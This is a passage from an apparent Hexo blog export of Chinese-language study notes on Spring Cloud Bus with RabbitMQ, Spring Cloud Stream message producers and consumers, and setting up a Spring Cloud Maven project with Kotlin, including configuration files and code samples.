<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>sudo tlp-stat -b 查看电池信息<br>sudo tlp-stat -d 查看磁盘信息<br>等</p>
]]></content>
      <categories>
        <category>Linux基础</category>
      </categories>
      <tags>
        <tag>ubuntu桌面端</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringCloud(8)</title>
    <url>/posts/d042e649/</url>
    <content><![CDATA[<h1 id="Bus消息总线"><a href="#Bus消息总线" class="headerlink" title="Bus消息总线"></a>Bus消息总线</h1><p><img src="https://image.zfxt.top/hexo-blog/SpringCloud(8)-2023-11-12-37-58.png"><br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(8)-2023-11-00-33-07.png"><br><strong>可以和消息队列（rabbitmq或kafuf）整合</strong></p>
<h2 id="安装rabbitmq"><a href="#安装rabbitmq" class="headerlink" title="安装rabbitmq"></a>安装rabbitmq</h2><p>可以查看我的这篇文章<a href="https://zfxt.top/index.php/archives/217/" title="rabbitmq入门">rabbitmq入门</a></p>
<h2 id="springcloud-全局广播通知"><a href="#springcloud-全局广播通知" class="headerlink" title="springcloud 全局广播通知"></a>springcloud 全局广播通知</h2><ol>
<li>先安装3355的客户端配置在配置一个3366的客户端</li>
</ol>
<h3 id="直接通知configServer服务中心，让所有从此获取config的微服务都得到通知"><a href="#直接通知configServer服务中心，让所有从此获取config的微服务都得到通知" class="headerlink" title="直接通知configServer服务中心，让所有从此获取config的微服务都得到通知"></a>直接通知configServer服务中心，让所有从此获取config的微服务都得到通知</h3><ol>
<li>服务端添加消息总线的支持<br><strong>pom</strong>：<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-bus-amqp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<strong>yml</strong><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">3344</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-config-center</span> <span class="comment"># 注册进Eureka服务器的微服务名</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">config:</span></span><br><span class="line">      <span class="attr">server:</span></span><br><span class="line">        <span class="attr">git:</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">https://gitee.com/zfx-t/springcloud-config.git</span></span><br><span class="line">          <span class="attr">search-paths:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">springcloud-config</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#### 搜索目录</span></span><br><span class="line">      <span class="attr">label:</span> <span class="string">master</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">rabbitmq:</span></span><br><span class="line">    <span class="attr">host:</span> <span class="string">localhost</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">5672</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">admin</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123</span></span><br><span class="line"><span class="comment">## rabbitmq相关配置，暴爵bus刷断配置的端点</span></span><br><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">endpoints:</span>  <span class="comment">#暴露bus刷断配置的端，点</span></span><br><span class="line">    <span class="attr">web:</span></span><br><span class="line">      <span class="attr">exposure:</span></span><br><span class="line">        <span class="attr">include:</span> <span class="string">&#x27;bus-refresh&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:7001/eureka</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li>客户端添加总线支持<br><strong>pom</strong>：<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-bus-amqp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<strong>yml</strong>:<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加rabbitmq配置</span></span><br><span class="line"><span class="string">在spring下面：</span></span><br><span class="line">  <span class="attr">rabbitmq:</span></span><br><span class="line">    <span class="attr">host:</span> <span class="string">localhost</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">5672</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">admin</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p>此时已经配置完成，只需要修改配置后，运维工程师向3344发送一个refresh请求，就会让所有的子微服务得到刷新<br><code>curl -X POST http://localhost:3344/actuator/bus-refresh</code></p>
<h4 id="定点通知，只通知一个服务更新，其他的不更新"><a href="#定点通知，只通知一个服务更新，其他的不更新" class="headerlink" title="定点通知，只通知一个服务更新，其他的不更新"></a>定点通知，只通知一个服务更新，其他的不更新</h4><p><img src="https://image.zfxt.top/hexo-blog/SpringCloud(8)-2023-11-03-39-56.png"><br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(8)-2023-11-10-14-04.png"></p>
<h3 id="通知单个微服务，然后广播其他微服务程序（不建议这样使用，会增加每个微服务的职责，还需要额外的消息通知功能）"><a href="#通知单个微服务，然后广播其他微服务程序（不建议这样使用，会增加每个微服务的职责，还需要额外的消息通知功能）" class="headerlink" title="通知单个微服务，然后广播其他微服务程序（不建议这样使用，会增加每个微服务的职责，还需要额外的消息通知功能）"></a>通知单个微服务，然后广播其他微服务程序（不建议这样使用，会增加每个微服务的职责，还需要额外的消息通知功能）</h3>]]></content>
      <categories>
        <category>springcloud</category>
      </categories>
  </entry>
  <entry>
    <title>SpringCloud(9)</title>
    <url>/posts/c959d708/</url>
    <content><![CDATA[<h1 id="stream消息驱动"><a href="#stream消息驱动" class="headerlink" title="stream消息驱动"></a>stream消息驱动</h1><p>官方定义Spring Cloud Stream是一个构建消息驱动微服务的框架</p>
<blockquote>
<p>应用程序通过inputs或者outputs来与Spring Cloud Stream中binder对象交互。通过我们配置来binding(绑定)，而Spring Cloud Stream的binder对象负责与消息中间件交互。所以，我们只需要搞清楚如何与Spring Cloud Stream交互就可以方便使用消息驱动的方式。<br>通过使用Spring Integration来连接消息代理中间件以实现消息事件驱动.Spring Cloud Stream为一些供应商的消息中间件产品提供了个性化的自动化配置实现，引用了发布-订阅、消费组、分区的三个核心概念。(目前支持rabbitmq，kafka)</p>
</blockquote>
<p>他出现的场景在于：<br>有没有一种新的技术诞生，让我们不再关注具体MQ的细节。我们只需要用一种适配绑定的方式，自动的给我们在各种MQ内切换。<br>我们就不需要考虑这么多rabbitmq，kafka，rocketmq等。这样可以降低开发难度和学习难度。<br><strong>屏蔽底层消息中间件的差异，降低切换成本，统一消息的编程模型</strong><br><strong>标准MQ：</strong><br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(9)-2023-11-05-51-40.png"><br>引入Stream后<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(9)-2023-11-14-40-11.png"></p>
<h2 id="Binder"><a href="#Binder" class="headerlink" title="Binder"></a>Binder</h2><p>这个用来实现屏蔽消息中间件的差异<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(9)-2023-11-07-38-56.png"><br>Stream中的消息通信方式遵循发布-订阅模式。Topic主题进行广播</p>
<h2 id="常用标准流程套路"><a href="#常用标准流程套路" class="headerlink" title="常用标准流程套路"></a>常用标准流程套路</h2><p><img src="https://image.zfxt.top/hexo-blog/SpringCloud(9)-2023-11-22-22-22.png"><br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(9)-2023-11-06-11-42.png"></p>
<ul>
<li>生产者<br><strong>POM</strong>：<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-stream-rabbit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<strong>YAML</strong>：<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8801</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-stream-provider</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">stream:</span></span><br><span class="line">      <span class="attr">binders:</span> <span class="comment">#在此处配置要绑定的rabbitmq的服务信息:</span></span><br><span class="line">        <span class="attr">defaultRabbit:</span> <span class="comment">#表示定义的名称，用于binding整合</span></span><br><span class="line">          <span class="attr">type:</span> <span class="string">rabbit</span> <span class="comment">#消息组件类型</span></span><br><span class="line">          <span class="attr">environment:</span> <span class="comment">#设置rabbitmq的相关的环境配置</span></span><br><span class="line">            <span class="attr">spring:</span></span><br><span class="line">              <span class="attr">rabbitmq:</span></span><br><span class="line">                <span class="attr">host:</span> <span class="string">localhost</span></span><br><span class="line">                <span class="attr">port:</span> <span class="number">5672</span></span><br><span class="line">                <span class="attr">username:</span> <span class="string">admin</span></span><br><span class="line">                <span class="attr">password:</span> <span class="number">123</span></span><br><span class="line"></span><br><span class="line">      <span class="attr">bindings:</span> <span class="comment">#服务的整合处理</span></span><br><span class="line">        <span class="attr">output:</span> <span class="comment">#这个名字是一个通道的名称</span></span><br><span class="line">          <span class="attr">destination:</span> <span class="string">studyExchange</span> <span class="comment">#表示要使用的Exchange名称定义</span></span><br><span class="line">          <span class="attr">content-type:</span> <span class="string">application/json</span> <span class="comment">#设置消息类型，本次为json,文本则设置text/plain</span></span><br><span class="line">          <span class="attr">binder:</span> <span class="string">defaultRabbit</span> <span class="comment">#设置要绑定的消息服务的具体设置</span></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:7001/eureka</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">lease-renewal-interval-in-seconds:</span> <span class="number">2</span> <span class="comment">#设置心跳的时间间隔（默认是30秒）</span></span><br><span class="line">    <span class="attr">lease-expiration-duration-in-seconds:</span> <span class="number">5</span> <span class="comment">#如果现在超过了5秒的间隔（默认是90秒）</span></span><br><span class="line">    <span class="attr">instance-id:</span> <span class="string">send-8801.com</span> <span class="comment">#在信息列表时显示主机名称</span></span><br><span class="line">    <span class="attr">prefer-ip-address:</span> <span class="literal">true</span> <span class="comment">#访间的路径变为IP地址</span></span><br></pre></td></tr></table></figure>
<strong>业务类：</strong><br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(9)-2023-11-20-03-26.png"><br><strong>service:</strong><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.cloud.stream.<span class="keyword">annotation</span>.EnableBinding</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.stream.messaging.Source</span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.MessageChannel</span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.support.MessageBuilder</span><br><span class="line"><span class="keyword">import</span> top.zfxt.springcloud.service.IMessageProvider</span><br><span class="line"><span class="keyword">import</span> java.util.UUID</span><br><span class="line"><span class="keyword">import</span> javax.<span class="keyword">annotation</span>.Resource</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  <span class="doctag">@author</span>:zfxt</span></span><br><span class="line"><span class="comment"> *  <span class="doctag">@version</span>:1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@EnableBinding(Source::class)</span><span class="comment">//定义消息的推送管道</span></span><br><span class="line"><span class="keyword">open</span> <span class="keyword">class</span> <span class="title class_">IMessageProviderImpl</span> : <span class="type">IMessageProvider</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">lateinit</span> <span class="keyword">var</span> output: MessageChannel<span class="comment">//消息发送管道</span></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">send</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">val</span> serial = UUID.randomUUID().toString()</span><br><span class="line">        output.send(MessageBuilder.withPayload(serial).build())</span><br><span class="line">        println(<span class="string">&quot;**********serial:<span class="variable">$serial</span>&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<strong>controller:</strong><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SendMessageController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">lateinit</span> <span class="keyword">var</span> messageProvider: IMessageProvider</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(<span class="string">&quot;/sendMessage&quot;</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">sendMessage</span><span class="params">()</span></span>: String &#123;</span><br><span class="line">        messageProvider.send()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>消费者</li>
</ul>
<p>pom保持和生产者一样<br><strong>YML</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8802</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-stream-consumer</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">stream:</span></span><br><span class="line">      <span class="attr">binders:</span> <span class="comment">#在此处配置要绑定的rabbitmq的服务信息:</span></span><br><span class="line">        <span class="attr">defaultRabbit:</span> <span class="comment">#表示定义的名称，用于binding整合</span></span><br><span class="line">          <span class="attr">type:</span> <span class="string">rabbit</span> <span class="comment">#消息组件类型</span></span><br><span class="line">          <span class="attr">environment:</span> <span class="comment">#设置rabbitmq的相关的环境配置</span></span><br><span class="line">            <span class="attr">spring:</span></span><br><span class="line">              <span class="attr">rabbitmq:</span></span><br><span class="line">                <span class="attr">host:</span> <span class="string">localhost</span></span><br><span class="line">                <span class="attr">port:</span> <span class="number">5672</span></span><br><span class="line">                <span class="attr">username:</span> <span class="string">admin</span></span><br><span class="line">                <span class="attr">password:</span> <span class="number">123</span></span><br><span class="line"></span><br><span class="line">      <span class="attr">bindings:</span> <span class="comment">#服务的整合处理</span></span><br><span class="line">        <span class="attr">input:</span> <span class="comment">#这个名字是一个通道的名称</span></span><br><span class="line">          <span class="attr">destination:</span> <span class="string">studyExchange</span> <span class="comment">#表示要使用的Exchange名称定义</span></span><br><span class="line">          <span class="attr">content-type:</span> <span class="string">application/json</span> <span class="comment">#设置消息类型，本次为json,文本则设置text/plain</span></span><br><span class="line">          <span class="attr">binder:</span> <span class="string">defaultRabbit</span> <span class="comment">#设置要绑定的消息服务的具体设置</span></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:7001/eureka</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">lease-renewal-interval-in-seconds:</span> <span class="number">2</span> <span class="comment">#设置心跳的时间间隔（默认是30秒）</span></span><br><span class="line">    <span class="attr">lease-expiration-duration-in-seconds:</span> <span class="number">5</span> <span class="comment">#如果现在超过了5秒的间隔（默认是90秒）</span></span><br><span class="line">    <span class="attr">instance-id:</span> <span class="string">receive-8802.com</span> <span class="comment">#在信息列表时显示主机名称</span></span><br><span class="line">    <span class="attr">prefer-ip-address:</span> <span class="literal">true</span> <span class="comment">#访间的路径变为IP地址</span></span><br></pre></td></tr></table></figure>
<p><strong>业务类：</strong></p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@EnableBinding(Sink::class)</span></span><br><span class="line"><span class="keyword">open</span> <span class="keyword">class</span> <span class="title class_">ReceiveMessageController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(<span class="string">&quot;\$&#123;server.port&#125;&quot;</span>)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">lateinit</span> <span class="keyword">var</span> serverPort: String</span><br><span class="line"></span><br><span class="line">    <span class="meta">@StreamListener(Sink.INPUT)</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">input</span><span class="params">(message: <span class="type">Message</span>&lt;<span class="type">String</span>&gt;)</span></span> &#123;</span><br><span class="line">        println(<span class="string">&quot;消费者一号，----》接受到的消息：<span class="subst">$&#123;message.payload&#125;</span> \t port：<span class="variable">$serverPort</span>&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="重复消费问题"><a href="#重复消费问题" class="headerlink" title="重复消费问题"></a>重复消费问题</h3><p>因为队列默认采用的是topic，所以每一条消息都会发送给所有的消费者，也就造成了所谓的重复消费的问题<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(9)-2023-11-02-04-30.png"><br>即，<strong>不同组是可以全面消费的（重复消费），同一组内会发生竞争关系，只有其中一个可以消费</strong><br>只要放于同一个组中就可以解决重复消费问题。<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(9)-2023-11-21-19-36.png"></p>
<h3 id="消息持久化"><a href="#消息持久化" class="headerlink" title="消息持久化"></a>消息持久化</h3><p>加个group就会自动消息持久化。<br>如果没有加入group，那么在消费者尚未启动时，生产者产生消息会导致消息的丢失。而如果加入了消息持久化，他就可以把曾经未获得的消息重新获取并消费</p>
]]></content>
      <categories>
        <category>springcloud</category>
      </categories>
  </entry>
  <entry>
    <title>SpringCloud框架学习(1)</title>
    <url>/posts/2440451f/</url>
    <content><![CDATA[<h1 id="微服务架构"><a href="#微服务架构" class="headerlink" title="微服务架构"></a>微服务架构</h1><p>微服务架构就是将一个集中式的服务应用拆分成很多个小部分的应用。每个服务之间相互配合使用。<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0(1)-2023-09-15-31-08.png"><br><strong>SpringCloud&#x3D;分布式微服务架构的一站式解决方案，是多种微服务架构落地技术的集合体。俗称微服务全家桶</strong><br><img src="https://image.zfxt.top/hexo-blog/SpringCloud%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0(1)-2023-09-06-59-30.png"></p>
<h2 id="版本配合"><a href="#版本配合" class="headerlink" title="版本配合"></a>版本配合</h2><p><a href="https://spring.io/projects/spring-cloud">https://spring.io/projects/spring-cloud</a><br>可以参照官网，因为cloud和boot的版本需要相互依赖，他们有版本的限制关系，如：<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0(1)-2023-09-19-07-28.png"><br>也可以查看这个<a href="https://start.spring.io/actuator/info">json格式表</a>.他会推荐搭配的版本</p>
<h2 id="关键组件"><a href="#关键组件" class="headerlink" title="关键组件"></a>关键组件</h2><p><img src="https://image.zfxt.top/hexo-blog/SpringCloud%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0(1)-2023-09-21-49-07.png"></p>
<h2 id="微服务工程的搭建"><a href="#微服务工程的搭建" class="headerlink" title="微服务工程的搭建"></a>微服务工程的搭建</h2><ol>
<li>首先在idea中新建一个maven项目。</li>
<li>然后删除其中的src文件夹。只将其作为一个pom包</li>
<li>关键是pom.xml的配置<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;project xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">         xmlns=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="line">         xsi:schemaLocation=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br><span class="line">    &lt;modelVersion&gt;<span class="number">4.0</span><span class="number">.0</span>&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">    &lt;artifactId&gt;cloud2020&lt;/artifactId&gt;</span><br><span class="line">    &lt;groupId&gt;top.zfxt.springcloud&lt;/groupId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.0</span>-SNAPSHOT&lt;/version&gt;</span><br><span class="line">    &lt;packaging&gt;pom&lt;/packaging&gt;</span><br><span class="line"></span><br><span class="line">    &lt;name&gt;consoleApp&lt;/name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;properties&gt;</span><br><span class="line">&lt;!--        统一jar包版本号--&gt;</span><br><span class="line">        &lt;project.build.sourceEncoding&gt;UTF-<span class="number">8</span>&lt;/project.build.sourceEncoding&gt;</span><br><span class="line">        &lt;kotlin.code.style&gt;official&lt;/kotlin.code.style&gt;</span><br><span class="line">        &lt;kotlin.compiler.jvmTarget&gt;<span class="number">1.8</span>&lt;/kotlin.compiler.jvmTarget&gt;</span><br><span class="line">        &lt;junit.version&gt;<span class="number">4.12</span>&lt;/junit.version&gt;</span><br><span class="line">        &lt;log4j.version&gt;<span class="number">1.2</span><span class="number">.17</span>&lt;/log4j.version&gt;</span><br><span class="line">        &lt;lombok.version&gt;<span class="number">1.16</span><span class="number">.18</span>&lt;/lombok.version&gt;</span><br><span class="line">        &lt;mysql.version&gt;<span class="number">5.1</span><span class="number">.47</span>&lt;/mysql.version&gt;</span><br><span class="line">        &lt;druid.version&gt;<span class="number">1.1</span><span class="number">.16</span>&lt;/druid.version&gt;</span><br><span class="line">        &lt;mybatis.spring.boot.version&gt;<span class="number">1.3</span><span class="number">.0</span>&lt;/mybatis.spring.boot.version&gt;</span><br><span class="line">    &lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">    &lt;repositories&gt;</span><br><span class="line">        &lt;repository&gt;</span><br><span class="line">            &lt;id&gt;mavenCentral&lt;/id&gt;</span><br><span class="line">            &lt;url&gt;https:<span class="comment">//maven.aliyun.com/repository/public&lt;/url&gt;</span></span><br><span class="line">        &lt;/repository&gt;</span><br><span class="line">    &lt;/repositories&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;!-- <span class="number">1</span>、只是声明依赖，并不实际引入，子项目按需声明使用的依赖 --&gt;</span><br><span class="line">    &lt;!-- <span class="number">2</span>、子项目可以继承父项目的 version 和 scope --&gt;</span><br><span class="line">    &lt;!-- <span class="number">3</span>、子项目若指定了 version 和 scope，以子项目为准 --&gt;</span><br><span class="line">    &lt;!--    子模块继承后，提供作用：锁定版本+子module不用写groupID和version--&gt;</span><br><span class="line">    &lt;dependencyManagement&gt;</span><br><span class="line"></span><br><span class="line">        &lt;dependencies&gt;</span><br><span class="line">            &lt;dependency&gt;</span><br><span class="line">                &lt;groupId&gt;org.jetbrains.kotlin&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;kotlin-test-junit5&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;<span class="number">1.9</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">                &lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">            &lt;/dependency&gt;</span><br><span class="line">            &lt;dependency&gt;</span><br><span class="line">                &lt;groupId&gt;org.junit.jupiter&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;junit-jupiter-engine&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;<span class="number">5.10</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">                &lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">            &lt;/dependency&gt;</span><br><span class="line">            &lt;dependency&gt;</span><br><span class="line">                &lt;groupId&gt;org.jetbrains.kotlin&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;kotlin-stdlib&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;<span class="number">1.9</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">            &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">            &lt;!--spring boot <span class="number">2.2</span><span class="number">.2</span>--&gt;</span><br><span class="line">            &lt;dependency&gt;</span><br><span class="line">                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;spring-boot-dependencies&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;<span class="number">2.2</span><span class="number">.2</span>.RELEASE&lt;/version&gt;</span><br><span class="line">                &lt;type&gt;pom&lt;/type&gt;</span><br><span class="line">                &lt;scope&gt;<span class="keyword">import</span>&lt;/scope&gt;</span><br><span class="line">            &lt;/dependency&gt;</span><br><span class="line">            &lt;!--spring cloud Hoxton.SR1--&gt;</span><br><span class="line">            &lt;dependency&gt;</span><br><span class="line">                &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;Hoxton.SR1&lt;/version&gt;</span><br><span class="line">                &lt;type&gt;pom&lt;/type&gt;</span><br><span class="line">                &lt;scope&gt;<span class="keyword">import</span>&lt;/scope&gt;</span><br><span class="line">            &lt;/dependency&gt;</span><br><span class="line">            &lt;!--spring cloud alibaba <span class="number">2.1</span><span class="number">.0</span>.RELEASE--&gt;</span><br><span class="line">            &lt;dependency&gt;</span><br><span class="line">                &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;spring-cloud-alibaba-dependencies&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;<span class="number">2.1</span><span class="number">.0</span>.RELEASE&lt;/version&gt;</span><br><span class="line">                &lt;type&gt;pom&lt;/type&gt;</span><br><span class="line">                &lt;scope&gt;<span class="keyword">import</span>&lt;/scope&gt;</span><br><span class="line">            &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">            &lt;dependency&gt;</span><br><span class="line">                &lt;groupId&gt;mysql&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;$&#123;mysql.version&#125;&lt;/version&gt;</span><br><span class="line">            &lt;/dependency&gt;</span><br><span class="line">            &lt;dependency&gt;</span><br><span class="line">                